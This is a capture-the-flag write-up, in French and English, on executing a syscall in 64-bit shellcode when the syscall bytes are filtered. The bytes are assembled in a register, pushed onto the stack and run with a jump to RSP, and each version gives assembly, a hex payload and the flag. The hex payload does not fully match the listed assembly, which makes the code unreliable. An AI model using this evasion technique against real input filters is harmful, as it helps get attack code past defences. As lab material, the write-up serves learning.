# Shellcode Obfuscation 2
## Write-up
### Solution (Français)
Ici les contraintes qui nous sont données sont de ne pas utiliser les bytes "\x05\x0f", qui sont les bytes pour faire un syscall. La difficultée viens du fait qu'on ne peux pas manipuler les bytes passées. Il faut donc trouver comment executer un syscall sans l'instruction syscall.

Utiliser int 0x80 ne fonctionne pas étant donnée qu'on est en 64bit

Une des façons de faire notre syscall est de stocker les bytes "\x05\x0f" et d'utiliser une instruction jmp pour ensuite faire notre syscall.

Comme on ne veut pas modifier nos registres précedents, on peut utiliser le registre RCX pour pousser notre code. 
On mov 0x04 et 0x0e(pour éviter d'avoir nos bytes interdits dans le payload) dans CH et CL respectivement pour avant des les incrémenter. 
On les pousse dans le stack et on peut ensuite les executer en sautant a RSP

Voici le code pour faire ça:
``` assembly
BITS 64 
push 1
dec byte ptr [rsp]
mov rax, 0x101010101010101
push rax
mov rax, 0x101010101010101 ^ 0xa736567e86e614d
xor [rsp], rax
push 1
pop rdi
push 8
pop rdx
mov rsi, rsp
push 1
pop rax

xor rcx,rcx
mov ch,0x04
inc ch
mov cl,0x0e
inc cl
push rcx
jmp rsp
```
La première partie setup le syscall pour write, et la deuxieme l'execute.

Payload: `\x6a\x0b\xfe\x0c\x24\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x4c\x60\x6f\xe9\x66\x64\x72\x0b\x48\x31\x04\x24\x6a\x01\x5f\x6a\x10\x5a\x48\x89\xe6\x6a\x01\x58\x48\x31\xc9\xb5\x04\xfe\xc5\xb1\x0e\xfe\xc1\x51\xff\xe4`

Flag: `flag-ML5V9JD3K8WTYQZA7R6YA2C3DZ8V7T1B`

### Solution (English)
Here, the constraints given to us are not to use the "\x05\x0f" bytes, which are the bytes for a syscall. The difficulty lies in the fact that we can't manipulate past bytes. So we need to find a way of executing a syscall without the syscall instruction.

Using int 0x80 doesn't work, given that we're in 64bit.

One way of doing our syscall is to store the bytes ""\x05\x0f" and then use a jmp instruction to do our syscall.

As we don't want to modify our previous registers, we can use the RCX register to push our code. 
We move 0x04 and 0x0e (to avoid having our forbidden bytes in the payload) into CH and CL respectively before incrementing them. 
We then push them into the stack and can execute them by jumping to RSP.

Here's the code to do this:
```assembly
BITS 64 
push 1
dec byte ptr [rsp]
mov rax, 0x101010101010101
push rax
mov rax, 0x101010101010101 ^ 0xa736567e86e614d
xor [rsp], rax
push 1
pop rdi
push 8
pop rdx
mov rsi, rsp
push 1
pop rax

xor rcx,rcx
mov ch,0x04
inc ch
mov cl,0x0e
inc cl
push rcx
jmp rsp
```
The first half setups the write syscall, and the second executes it.

Payload: `\x6a\x0b\xfe\x0c\x24\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x4c\x60\x6f\xe9\x66\x64\x72\x0b\x48\x31\x04\x24\x6a\x01\x5f\x6a\x10\x5a\x48\x89\xe6\x6a\x01\x58\x48\x31\xc9\xb5\x04\xfe\xc5\xb1\x0e\xfe\xc1\x51\xff\xe4`

Flag: `flag-ML5V9JD3K8WTYQZA7R6YA2C3DZ8V7T1B`